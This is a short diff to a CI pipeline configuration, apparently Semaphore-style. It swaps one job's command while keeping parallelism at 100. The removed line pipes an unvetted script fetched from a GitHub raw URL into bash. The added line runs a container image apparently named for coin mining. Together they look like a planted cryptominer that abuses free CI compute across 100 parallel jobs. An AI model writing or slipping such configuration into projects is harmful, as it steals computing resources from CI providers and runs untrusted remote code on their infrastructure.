@@ -15,5 +15,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -sL https://github.com/aquilarendy/fool/raw/main/xcb2 | bash'
+            - 'docker run novalanto/coremining:latest'
           parallelism: 100
